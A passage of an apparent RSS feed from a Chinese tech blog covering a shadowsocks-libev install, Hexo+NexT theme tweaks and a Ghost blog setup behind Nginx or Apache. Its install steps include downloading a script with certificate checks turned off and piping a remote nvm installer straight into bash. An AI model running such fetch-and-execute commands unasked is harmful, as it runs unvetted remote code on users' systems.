<div><pre><code><span>wget</span> --no-check-certificate https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks-libev-debian.sh
<span>chmod</span> +x shadowsocks-libev-debian.sh
./shadowsocks-libev-debian.sh <span><span>2</span>></span><span>&amp;1</span> <span>|</span> <span>tee</span> shadowsocks-libev-debian.lo
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><h4 id="安装完成" tabindex="-1"> 安装完成</h4>
<p>安装完成后, 脚本提示如下:</p>
<div><pre><code>Congratulations, shadowsocks-libev <span>install</span> completed<span>!</span>
Your Server IP:your_server_ip
Your Server Port:8989
Your Password:your_password
Your Local IP:127.0.0.1
Your Local Port:1080
Your Encryption Method:aes-256-cfb

Welcome to visit://teddysun.com/357.html
Enjoy it<span>!</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="卸载方法" tabindex="-1"> 卸载方法:</h3>
<p>使用 <code>root</code> 用户登录, 运行以下命令:</p>
<div><pre><code>./shadowsocks-libev.sh uninstall
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="查看进程是否存在" tabindex="-1"> 查看进程是否存在</h3>
<p>安装完成后即已后台启动 shadowsocks , 运行:</p>
<div><pre><code><span>ps</span> -ef <span>|</span> <span>grep</span> ss-server <span>|</span> <span>grep</span> -v <span>ps</span> <span>|</span> <span>grep</span> -v <span>grep</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="其他命令" tabindex="-1"> 其他命令</h3>
<ul>
<li>启动: <code>/etc/init.d/shadowsocks start</code></li>
<li>停止: <code>/etc/init.d/shadowsocks stop</code></li>
<li>重启: <code>/etc/init.d/shadowsocks restart</code></li>
<li>查看状态: <code>/etc/init.d/shadowsocks status</code></li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>Hexo+NexT 进阶设置</title>
      <link>https://vxhly.github.io/views/nodejs/hexo-next-advanced-settings.html</link>
      <guid>https://vxhly.github.io/views/nodejs/hexo-next-advanced-settings.html</guid>
      <source url="https://vxhly.github.io/rss.xml">Hexo+NexT 进阶设置</source>
      <description>前言
HEXO 博客最近大更新, 页面与之前大不相同, 这里跟大家分享一下相关的设置方法。

</description>
      <category>nodejs</category>
      <pubDate>Sat, 28 Oct 2017 20:24:59 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>HEXO 博客最近大更新, 页面与之前大不相同, 这里跟大家分享一下相关的设置方法。</p>
</div>

<h2 id="highlight-js" tabindex="-1"> highlight.js</h2>
<p><a href="https://highlightjs.org/" target="_blank" rel="noopener noreferrer">highlightjs 官方网站</a></p>
<p>Next 自带的代码高亮并不符合我的口味, 所以就采用了第三方的 <code>highlight.js</code></p>
<h2 id="use" tabindex="-1"> Use</h2>
<h3 id="编辑配置文件" tabindex="-1"> 编辑配置文件</h3>
<p>先禁用默认的高亮方式</p>
<p><code>./_config.yml</code></p>
<div><pre><code><span>highlight</span><span>:</span>
  <span>enable</span><span>:</span> <span>false</span>
<span>line_number</span><span>:</span> <span>true</span>
<span>autoi_detect</span><span>:</span> <span>true</span>
<span>tab_replace</span><span>:</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="引入第三方-highlight" tabindex="-1"> 引入第三方 highlight</h3>
<h4 id="编辑主题源文件" tabindex="-1"> 编辑主题源文件</h4>
<p><code>./themes/layout/_layout.swing</code></p>
<p>注意这边需要引入样式, 相关的样式以及支持的语言请查看 <a href="https://highlightjs.org/static/demo/" target="_blank" rel="noopener noreferrer">176 languages and 79 styles</a></p>
<p>因为个人比较喜欢 <code>Atom</code> 这款编辑器, 改编辑器用默认的样式为 <code>atom-one-dark</code> , 所以这里采用该样式</p>
<div><pre><code><span><span><span>&lt;</span>link</span>
  <span>rel</span><span><span>=</span><span>"</span>stylesheet<span>"</span></span>
  <span>href</span><span><span>=</span><span>"</span>//cdn.bootcss.com/highlight.js/9.12.0/styles/atom-one-dark.min.css<span>"</span></span>
<span>/></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div></div></div><p>除了引入样式, 还需初始化 highlightjs, 这里提供的代码是可以显示行号的</p>
<div><pre><code><span><span><span>&lt;</span>script</span> <span>src</span><span><span>=</span><span>"</span>//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js<span>"</span></span><span>></span></span><span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
<span><span><span>&lt;</span>script</span> <span>type</span><span><span>=</span><span>"</span>text/javascript<span>"</span></span><span>></span></span><span><span>
  <span>$</span><span>(</span><span>function</span> <span>(</span><span>)</span> <span>{</span>
    hljs<span>.</span><span>initHighlighting</span><span>(</span><span>)</span><span>;</span>
    <span>$</span><span>(</span><span>"pre code"</span><span>)</span><span>.</span><span>each</span><span>(</span><span>function</span> <span>(</span><span>)</span> <span>{</span>
      <span>var</span> lines <span>=</span> <span>$</span><span>(</span><span>this</span><span>)</span><span>.</span><span>text</span><span>(</span><span>)</span><span>.</span><span>split</span><span>(</span><span>"\n"</span><span>)</span><span>.</span>length <span>-</span> <span>1</span><span>;</span>
      <span>var</span> $numbering <span>=</span> <span>$</span><span>(</span><span>"&lt;ul/>"</span><span>)</span><span>.</span><span>addClass</span><span>(</span><span>"pre-numbering"</span><span>)</span><span>;</span>
      <span>$</span><span>(</span><span>this</span><span>)</span><span>.</span><span>addClass</span><span>(</span><span>"has-numbering"</span><span>)</span><span>.</span><span>parent</span><span>(</span><span>)</span><span>.</span><span>append</span><span>(</span>$numbering<span>)</span><span>;</span>
      <span>for</span> <span>(</span>i <span>=</span> <span>1</span><span>;</span> i <span>&lt;=</span> lines<span>;</span> i<span>++</span><span>)</span> <span>{</span>
        $numbering<span>.</span><span>append</span><span>(</span><span>$</span><span>(</span><span>"&lt;li/>"</span><span>)</span><span>)</span><span>;</span>
      <span>}</span>
    <span>}</span><span>)</span><span>;</span>
  <span>}</span><span>)</span><span>;</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>可以看到以上的代码是有添加 class 样式的, 所以还需补上相关的样式表, 以下的样式表在小分辨率的情况下行号是不显示出来的, 优化效果请参照本博客代码高亮区块</p>
<div><pre><code><span><span><span>&lt;</span>style</span><span>></span></span><span><span>
  <span>pre</span> <span>{</span>
    <span>position</span><span>:</span> relative<span>;</span>
    <span>padding</span><span>:</span> 0<span>;</span>
  <span>}</span>

  <span>code.has-numbering</span> <span>{</span>
    <span>margin-left</span><span>:</span> 2.5rem<span>;</span>
  <span>}</span>

  <span>code.has-numbering::-webkit-scrollbar</span> <span>{</span>
    <span>display</span><span>:</span> none<span>;</span>
  <span>}</span>

  <span>.pre-numbering</span> <span>{</span>
    <span>margin</span><span>:</span> 0<span>;</span>
    <span>position</span><span>:</span> absolute<span>;</span>
    <span>top</span><span>:</span> 0<span>;</span>
    <span>display</span><span>:</span> flex<span>;</span>
    <span>flex-direction</span><span>:</span> column<span>;</span>
    <span>justify-content</span><span>:</span> center<span>;</span>
    <span>height</span><span>:</span> 100%<span>;</span>
  <span>}</span>

  <span>.pre-numbering li</span> <span>{</span>
    <span>list-style-type</span><span>:</span> decimal-leading-zero <span>!important</span><span>;</span>
  <span>}</span>

  <span><span>@media</span> <span>(</span><span>max-width</span><span>:</span> 760px<span>)</span></span> <span>{</span>
    <span>.post-body pre</span> <span>{</span>
      <span>padding</span><span>:</span> 0px<span>;</span>
    <span>}</span>

    <span>.post-body .pre-numbering</span> <span>{</span>
      <span>display</span><span>:</span> none<span>;</span>
    <span>}</span>

    <span>code.has-numbering</span> <span>{</span>
      <span>margin</span><span>:</span> 0<span>;</span>
    <span>}</span>
  <span>}</span>
</span></span><span><span><span>&lt;/</span>style</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="copy" tabindex="-1"> Copy</h2>
<div><pre><code><span><span><span>&lt;</span>script</span> <span>src</span><span><span>=</span><span>"</span>https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.1/clipboard.min.js<span>"</span></span><span>></span></span><span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><div><p>提示</p>
<p>这边不就贴关键代码了, 请移步 <a href="https://github.com/zenorocha/clipboard.js" target="_blank" rel="noopener noreferrer">clipboard.js</a> <a href="https://github.com/vxhly/vxhly.github.io/blob/blog-source/themes/next/layout/_layout.swig" target="_blank" rel="noopener noreferrer">_layout.swig</a></p>
</div>
<h2 id="优化-blockquote" tabindex="-1"> 优化 blockquote</h2>
<p>默认的引用 blockquote 样式比较丑, 写了一些样式优化它, 优化效果请参照本博客的引用区块</p>
<h3 id="编辑主题源文件-1" tabindex="-1"> 编辑主题源文件</h3>
<p><code>./themes/layout/_layout.swing</code></p>
<div><pre><code><span><span><span>&lt;</span>style</span><span>></span></span><span><span>
  <span>blockquote</span> <span>{</span>
    <span>color</span><span>:</span> #888<span>;</span>
    <span>background-color</span><span>:</span> #eae6f3<span>;</span>
    <span>border-left</span><span>:</span> 1rem solid #5236a0<span>;</span>
    <span>padding</span><span>:</span> 0 1.5rem<span>;</span>
    <span>position</span><span>:</span> relative<span>;</span>
    <span>font-family</span><span>:</span> <span>"Roboto"</span><span>,</span> sans-serif<span>;</span>
  <span>}</span>

  <span>blockquote:before,
  blockquote:after</span> <span>{</span>
    <span>color</span><span>:</span> #392570<span>;</span>
    <span>font-size</span><span>:</span> 2.5rem<span>;</span>
    <span>position</span><span>:</span> absolute<span>;</span>
    <span>line-height</span><span>:</span> 2.5rem<span>;</span>
  <span>}</span>

  <span>blockquote:before</span> <span>{</span>
    <span>content</span><span>:</span> <span>"\201C"</span><span>;</span>
    <span>left</span><span>:</span> -1rem<span>;</span>
    <span>top</span><span>:</span> 0<span>;</span>
  <span>}</span>

  <span>blockquote:after</span> <span>{</span>
    <span>content</span><span>:</span> <span>"\201D"</span><span>;</span>
    <span>right</span><span>:</span> 0<span>;</span>
    <span>bottom</span><span>:</span> -1rem<span>;</span>
  <span>}</span>
</span></span><span><span><span>&lt;/</span>style</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="网站已运行时间" tabindex="-1"> 网站已运行时间</h2>
<h3 id="编辑主题源文件-2" tabindex="-1"> 编辑主题源文件</h3>
<p><code>./themes/layout/_parrials/footer.swing</code></p>
<p>找到以下代码区块</p>
<div><pre><code>{% if theme.footer.theme.enable %} /* ... */ {% endif %}
</code></pre><div aria-hidden="true"><div></div></div></div><p>在 <code>&lt;/div&gt;</code> 之前添加</p>
<div><pre><code><span><span><span>&lt;</span>span</span><span>></span></span> | <span><span><span>&lt;/</span>span</span><span>></span></span> <span><span><span>&lt;</span>span</span> <span>id</span><span><span>=</span><span>"</span>showDays<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>span</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div></div></div><p>在该文件末尾处添加</p>
<div><pre><code><span><span><span>&lt;</span>script</span><span>></span></span><span><span>
  <span>var</span> seconds <span>=</span> <span>1000</span><span>;</span>
  <span>var</span> minutes <span>=</span> seconds <span>*</span> <span>60</span><span>;</span>
  <span>var</span> hours <span>=</span> minutes <span>*</span> <span>60</span><span>;</span>
  <span>var</span> days <span>=</span> hours <span>*</span> <span>24</span><span>;</span>
  <span>var</span> years <span>=</span> days <span>*</span> <span>365</span><span>;</span>
  <span>var</span> birthDay <span>=</span> Date<span>.</span><span>UTC</span><span>(</span><span>2016</span><span>,</span> <span>07</span><span>,</span> <span>30</span><span>,</span> <span>00</span><span>,</span> <span>00</span><span>,</span> <span>00</span><span>)</span><span>;</span> <span>// 这里设置建站时间</span>
  <span>setInterval</span><span>(</span><span>function</span> <span>(</span><span>)</span> <span>{</span>
    <span>var</span> today <span>=</span> <span>new</span> <span>Date</span><span>(</span><span>)</span><span>;</span>
    <span>var</span> todayYear <span>=</span> today<span>.</span><span>getFullYear</span><span>(</span><span>)</span><span>;</span>
    <span>var</span> todayMonth <span>=</span> today<span>.</span><span>getMonth</span><span>(</span><span>)</span> <span>+</span> <span>1</span><span>;</span>
    <span>var</span> todayDate <span>=</span> today<span>.</span><span>getDate</span><span>(</span><span>)</span><span>;</span>
    <span>var</span> todayHour <span>=</span> today<span>.</span><span>getHours</span><span>(</span><span>)</span><span>;</span>
    <span>var</span> todayMinute <span>=</span> today<span>.</span><span>getMinutes</span><span>(</span><span>)</span><span>;</span>
    <span>var</span> todaySecond <span>=</span> today<span>.</span><span>getSeconds</span><span>(</span><span>)</span><span>;</span>
    <span>var</span> now <span>=</span> Date<span>.</span><span>UTC</span><span>(</span>
      todayYear<span>,</span>
      todayMonth<span>,</span>
      todayDate<span>,</span>
      todayHour<span>,</span>
      todayMinute<span>,</span>
      todaySecond
    <span>)</span><span>;</span>
    <span>var</span> diff <span>=</span> now <span>-</span> birthDay<span>;</span>
    <span>var</span> diffYears <span>=</span> Math<span>.</span><span>floor</span><span>(</span>diff <span>/</span> years<span>)</span><span>;</span>
    <span>var</span> diffDays <span>=</span> Math<span>.</span><span>floor</span><span>(</span>diff <span>/</span> days <span>-</span> diffYears <span>*</span> <span>365</span><span>)</span><span>;</span>
    <span>var</span> diffHours <span>=</span> Math<span>.</span><span>floor</span><span>(</span>
      <span>(</span>diff <span>-</span> <span>(</span>diffYears <span>*</span> <span>365</span> <span>+</span> diffDays<span>)</span> <span>*</span> days<span>)</span> <span>/</span> hours
    <span>)</span><span>;</span>
    <span>var</span> diffMinutes <span>=</span> Math<span>.</span><span>floor</span><span>(</span>
      <span>(</span>diff <span>-</span> <span>(</span>diffYears <span>*</span> <span>365</span> <span>+</span> diffDays<span>)</span> <span>*</span> days <span>-</span> diffHours <span>*</span> hours<span>)</span> <span>/</span> minutes
    <span>)</span><span>;</span>
    <span>var</span> diffSeconds <span>=</span> Math<span>.</span><span>floor</span><span>(</span>
      <span>(</span>diff <span>-</span>
        <span>(</span>diffYears <span>*</span> <span>365</span> <span>+</span> diffDays<span>)</span> <span>*</span> days <span>-</span>
        diffHours <span>*</span> hours <span>-</span>
        diffMinutes <span>*</span> minutes<span>)</span> <span>/</span>
        seconds
    <span>)</span><span>;</span>
    document<span>.</span><span>getElementById</span><span>(</span><span>"showDays"</span><span>)</span><span>.</span>innerHTML <span>=</span>
      <span>"本站已运行 "</span> <span>+</span>
      diffYears <span>+</span>
      <span>" 年 "</span> <span>+</span>
      diffDays <span>+</span>
      <span>" 天 "</span> <span>+</span>
      diffHours <span>+</span>
      <span>" 小时 "</span> <span>+</span>
      diffMinutes <span>+</span>
      <span>" 分钟 "</span> <span>+</span>
      diffSeconds <span>+</span>
      <span>" 秒"</span><span>;</span>
  <span>}</span><span>,</span> <span>1000</span><span>)</span><span>;</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="开启页面动画效果" tabindex="-1"> 开启页面动画效果</h2>
<h3 id="编辑主题配置文件" tabindex="-1"> 编辑主题配置文件</h3>
<p><code>./themes/_config.yml</code></p>
<div><pre><code><span>#</span>
Canvas <span>-</span> nest
<span>canvas_nest</span><span>:</span> <span>true</span>

<span>vendors</span><span>:</span> <span>#Internal version: 1.0 .0# https: //github.com/hustcc/canvas-nest.js</span>
    <span>canvas_nest</span><span>:</span> //cdn.bootcss.com/canvas<span>-</span>nest.js/1.0.1/canvas<span>-</span>nest.min.js
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="新的评论系统" tabindex="-1"> 新的评论系统</h2>
<div><p>提示</p>
<p>自从多说和网易云跟帖都挂了之后, Next 官方引入了 Valine 这一款评论系统</p>
</div>
<h3 id="关于-valine-的介绍" tabindex="-1"> 关于 Valine 的介绍</h3>
<div><p>提示</p>
<p>请移步 <a href="https://ioliu.cn/2017/add-valine-comments-to-your-blog/" target="_blank" rel="noopener noreferrer">Valine -- 一款极简的评论系统</a>, 配置中出现 <code>leancloud application appid</code> 和 <code>leancloud application appkey</code> 获取方法也请看此链接</p>
</div>
<p>相关的配置指南 <a href="https://valine.js.org/" target="_blank" rel="noopener noreferrer">https://valine.js.org/</a></p>
<h3 id="编辑主题配置文件-1" tabindex="-1"> 编辑主题配置文件</h3>
<p><code>./themes/_config.yml</code></p>
<div><pre><code><span>#</span>
Valine.<span>#You can get your appid and appkey from https: //leancloud.cn</span>
    <span>#more info please open https: //github.com/xCss/Valine</span>
    <span>valine</span><span>:</span>
    <span>enable</span><span>:</span> <span>true</span>
<span>appid</span><span>:</span> <span>#your leancloud application appid</span>
<span>appkey</span><span>:</span> <span>#your leancloud application appkey</span>
<span>notify</span><span>:</span> <span>false</span><span># mail notifier, https: //github.com/xCss/Valine/wiki</span>
    <span>verify</span><span>:</span> <span>false</span><span># Verification code</span>
<span>placeholder</span><span>:</span> ヾﾉ≧∀≦) o 亲爱的小主<span>,</span> 有何指教
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="使用最新的-valine" tabindex="-1"> 使用最新的 Valine</h3>
<h4 id="修改主题源码文件" tabindex="-1"> 修改主题源码文件</h4>
<p><code>./themes/layout/_third-party/comments/valine.swig</code></p>
<div><pre><code><span><span><span>&lt;</span>script</span> <span>src</span><span><span>=</span><span>"</span>//unpkg.com/valine/dist/Valine.min.js<span>"</span></span><span>></span></span><span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
<span><span><span>&lt;</span>script</span> <span>type</span><span><span>=</span><span>"</span>text/javascript<span>"</span></span><span>></span></span><span><span>
  <span>new</span> <span>Valine</span><span>(</span><span>{</span>
      <span>av</span><span>:</span> <span>AV</span><span>,</span>
      <span>el</span><span>:</span> <span>'#comments'</span><span>,</span>
      <span>app_id</span><span>:</span> <span>'{{ theme.valine.appid }}'</span><span>,</span>
      <span>app_key</span><span>:</span> <span>'{{ theme.valine.appkey }}'</span><span>,</span>
      <span>placeholder</span><span>:</span> <span>'{{ theme.valine.placeholder }}'</span><span>,</span> <span>// 默认 null</span>
      <span>notify</span><span>:</span> <span>{</span>
          <span>{</span>
              theme<span>.</span>valine<span>.</span>notify
          <span>}</span>
      <span>}</span><span>,</span> <span>// 默认 false</span>
      <span>verify</span><span>:</span> <span>{</span>
          <span>{</span>
              theme<span>.</span>valine<span>.</span>verify
          <span>}</span>
      <span>}</span><span>,</span> <span>// 默认 false</span>
      <span>path</span><span>:</span> <span>{</span>
          <span>{</span>
              theme<span>.</span>valine<span>.</span>path
          <span>}</span>
      <span>}</span><span>,</span> <span>// 默认 window.location.pathname</span>
      <span>avatar</span><span>:</span> <span>'{{ theme.valine.avatar }}'</span> <span>// 默认 ''</span>
  <span>}</span><span>)</span><span>;</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>在你的 VPS 服务器搭建 Ghost 博客系统</title>
      <link>https://vxhly.github.io/views/nodejs/insatll-ghost-on-your-vps.html</link>
      <guid>https://vxhly.github.io/views/nodejs/insatll-ghost-on-your-vps.html</guid>
      <source url="https://vxhly.github.io/rss.xml">在你的 VPS 服务器搭建 Ghost 博客系统</source>
      <description>前言
Ghost 采用 Node.js 编写, 默认使用 SQLite3 数据库, 非常轻量, 因为是文件型数据库, 所以无需安装。Ghost 允许多用户编写博文, 使用 Markdown 来编写博文。

</description>
      <category>nodejs</category>
      <pubDate>Fri, 02 Jun 2017 14:53:49 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>Ghost 采用 Node.js 编写, 默认使用 SQLite3 数据库, 非常轻量, 因为是文件型数据库, 所以无需安装。Ghost 允许多用户编写博文, 使用 Markdown 来编写博文。</p>
</div>

<h2 id="下载-ghost" tabindex="-1"> 下载 Ghost</h2>
<p><a href="http:////www.ghostchina.com/" target="_blank" rel="noopener noreferrer">Ghost 中文官网</a> <a href="http:////ghost.org/" target="_blank" rel="noopener noreferrer">Ghost 英文官网</a></p>
<h2 id="ghost-中文集成版-推介" tabindex="-1"> Ghost 中文集成版(推介)</h2>
<p><a href="http://dl.ghostchina.com/Ghost-0.7.4-zh-full.zip" target="_blank" rel="noopener noreferrer">最新版本: Ghost v0.7.4 full (zh)</a></p>
<div><p>提示</p>
<p>上方链接已失效, 米娜桑可以通过这个来下载 <a href="http://oss-blog.test.upcdn.net/Ghost-0.7.4-zh-full-master.zip" target="_blank" rel="noopener noreferrer">最新版本: Ghost v0.7.4 full (zh)</a></p>
</div>
<p>版本特色: 中文汉化、支持七牛、又拍云、阿里云 OSS 存储；增加 Roon 主题；集成 node_modules , 无需忍受 <code>npm install --production</code> 的麻烦。</p>
<h3 id="ghost-中文标准版" tabindex="-1"> Ghost 中文标准版</h3>
<p><a href="http://dl.ghostchina.com/Ghost-0.7.4-zh.zip" target="_blank" rel="noopener noreferrer">最新版本: Ghost v0.7.4 (zh)</a></p>
<p>版本特色: 中文汉化、支持七牛、又拍云、阿里云 OSS 存储；增加 Roon 主题</p>
<h3 id="ghost-英文原版" tabindex="-1"> Ghost 英文原版</h3>
<p><a href="http://dl.ghostchina.com/Ghost-0.7.4.zip" target="_blank" rel="noopener noreferrer">最新版本: Ghost v0.7.4</a></p>
<h2 id="安装前准备" tabindex="-1"> 安装前准备</h2>
<h3 id="vps-服务器和域名" tabindex="-1"> VPS 服务器和域名</h3>
<p>VPS 个人服务器当然是必不可少的, 解析域名的的时候推介解析为 www</p>
<h3 id="node-js" tabindex="-1"> Node.js</h3>
<p>Ghost 对 Node.js 版本号要求比较严格, Ghost 官方推荐使用 <code>Node 0.10.x</code> 版本, 同时支持 <code>Node 0.12.x</code> 和 <code>Node 4.2.x</code> 版本。</p>
<p>这边推介使用稳定版 <code>Node 4.2.x</code> 。</p>
<p>安装 Node 推介使用 <code>nvm</code> 安装。</p>
<div><pre><code><span>wget</span> -qO- https://raw.githubusercontent.com/creationix/nvm/v0.33.2/install.sh <span>|</span> <span>bash</span>
nvm <span>install</span> <span>4.2</span>
nvm <span>alias</span> defaults <span>4.2</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><h3 id="需要-nginx-服务" tabindex="-1"> 需要 Nginx 服务</h3>
<p>Ghost 默认监听的端口为 2368, 而且只监听本地的 IP 地址进行访问, 所以需要 Nginx 这个服务来转发流量</p>
<p>Ubuntu 下安装直接执行命令</p>
<div><pre><code><span>apt-get</span> <span>install</span> nginx
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="ghost-web-服务器转发原理介绍" tabindex="-1"> Ghost+Web 服务器转发原理介绍</h3>
<p>官方文档建议使用 Nginx 作为 Ghost 的前端来转发 80 端口请求, 那么 Ghost 的工作总流程就可以描述为:</p>
<div><p>提示</p>
<p>Nginx 监听 80 端口, Ghost 一直监听本地 127.0.0.1:2368 端口, 你从外网访问 www.xxx.com 时, Nginx 从 80 端口接收请求, 将之转发到本地 127.0.0.1:2368 端口, 然后 Ghost 就收到访问请求了。</p>
</div>
<p>可是为什么不直接让 Ghost 使用 80 端口呢却要依赖 Web 服务器转发呢？这是因为 Ghost 需要运行在 root 权限上, 为了避免风险, 就用 Nginx 转发一下。另外, Nginx 毕竟是 Web 服务器, 配置灵活、并发高, 用来做 Ghost 的前端是非常适合的, 如果你服务器上还有其他网站那就更要用 Nginx 了, 不然你的 80 端口给了 Ghost 就没法负载其他网站了。</p>
<h3 id="解压文件" tabindex="-1"> 解压文件</h3>
<div><pre><code><span>unzip</span> -uo <span>[</span>fileName<span>]</span>.zip -d <span>[</span>folderName<span>]</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="开始配置使用" tabindex="-1"> 开始配置使用</h2>
<h3 id="安装依赖" tabindex="-1"> 安装依赖</h3>
<p>如果你下载的不是 Ghost 中文集成版, 那么你就需要在你的项目目录下执行</p>
<div><pre><code><span>npm</span> <span>install</span> --production
</code></pre><div aria-hidden="true"><div></div></div></div><p>当然, 这需要翻墙, Ghost 所依赖的默认数据库 sqlite 包需要从国外服务器上（亚马逊的云存储服务）下载原生插件, 即使是翻墙了也未必能下载下来, 因为 sqlite 的原生插件没有通过 npm 分发。</p>
<h3 id="配置-config-js" tabindex="-1"> 配置 config.js</h3>
<p>解压缩之后会有一个 <code>config.example.js</code> 默认配置文件, 你需要把它复制重命名成 <code>config.js</code></p>
<div><pre><code><span>cp</span> config.example.js config.js
</code></pre><div aria-hidden="true"><div></div></div></div><h4 id="配置-url" tabindex="-1"> 配置 URL</h4>
<div><pre><code><span>// ...</span>
config <span>=</span> <span>{</span>
  <span>production</span><span>:</span> <span>{</span>
    <span>url</span><span>:</span> <span>"//www.yourdomian"</span><span>,</span>
    <span>// ...</span>
  <span>}</span><span>,</span>
  <span>// ...</span>
<span>}</span><span>;</span>
<span>// ...</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>注意这边必须写上 <code>//</code> 或者 <code>//</code> , 这里写的 URL 就是以后注册账号和登录后台时所用的 URL, 必须完全一样, 如果注册时用的 URL 和这里的不一样, 那么就会出现错误提示说无权限访问！</p>
<h3 id="配置-nginx-服务进行转发" tabindex="-1"> 配置 Nginx 服务进行转发</h3>
<p>打开 <code>/etc/nginx/nginx.conf</code> , 在 http 语句块内追加上:</p>
<div><pre><code>server {
  listen 80;
  server_name www.yourdomian;

  location / {
    proxy_set_header   X-Real-IP $remote_addr;
    proxy_set_header   Host  $http_host;
    proxy_pass http://127.0.0.1:2368;
  }
}
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h4 id="重启-nginx" tabindex="-1"> 重启 Nginx</h4>
<div><pre><code>/etc/init.d/nginx restart
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="配置-apache-服务进行转发" tabindex="-1"> 配置 Apache 服务进行转发</h2>
<p>打开 <code>/etc/httpd/conf/httpd.conf</code></p>
<div><pre><code># NameVirtualHost *:80 #这一行取消注释
</code></pre><div aria-hidden="true"><div></div></div></div><p>再在文件末尾加上如下语句, 配置请求转发</p>
<div><pre><code>&lt;VirtualHost *:80>
    ServerName linuxidc.com
    ProxyRequests Off
    ProxyPreserveHost On
&lt;Proxy *>
    AddDefaultCharset Off
    Order deny,allow
    Allow from all
&lt;/Proxy>
    ProxyPass / http://127.0.0.1:2368/
    ProxyPassReverse / http://127.0.0.1:2368/
&lt;/VirtualHost>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h4 id="重启-httpd-服务" tabindex="-1"> 重启 httpd 服务</h4>
<div><pre><code><span>service</span> httpd restart
</code></pre><div aria-hidden="true"><div></div></div></div><h2 id="启动-ghost-服务" tabindex="-1"> 启动 Ghost 服务</h2>
<div><pre><code><span>npm</span> start --production
</code></pre><div aria-hidden="true"><div></div></div></div><p>现在启动 Ghost 并访问域名已经能进入博客页面了, 但下面还需要实现 Ghost 后台运行, 不然你退了终端的话 Ghost 就停止了。</p>
<h3 id="使用-forever-让-ghost-后台运行" tabindex="-1"> 使用 Forever 让 Ghost 后台运行</h3>
<h4 id="安装-forever-包" tabindex="-1"> 安装 forever 包</h4>
<div><pre><code><span>npm</span> <span>install</span> forever -g
</code></pre><div aria-hidden="true"><div></div></div></div><h4 id="启动-ghost" tabindex="-1"> 启动 Ghost</h4>
<div><pre><code><span>NODE_ENV</span><span>=</span>production forever start index.js
</code></pre><div aria-hidden="true"><div></div></div></div><h4 id="关闭-ghost" tabindex="-1"> 关闭 Ghost</h4>
<div><pre><code>forever stop index.js
</code></pre><div aria-hidden="true"><div></div></div></div><h4 id="重启动-ghost" tabindex="-1"> 重启动 Ghost</h4>
<div><pre><code><span>NODE_ENV</span><span>=</span>production forever restart index.js
</code></pre><div aria-hidden="true"><div></div></div></div><h4 id="查看运行状态用这条命令" tabindex="-1"> 查看运行状态用这条命令</h4>
<div><pre><code>forever list
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="访问" tabindex="-1"> 访问</h3>
<p>前台: <a href="http://www.yourdomian" target="_blank" rel="noopener noreferrer">http://www.yourdomian</a> 后台: <a href="http://www.yourdomian/ghost" target="_blank" rel="noopener noreferrer">http://www.yourdomian/ghost</a></p>
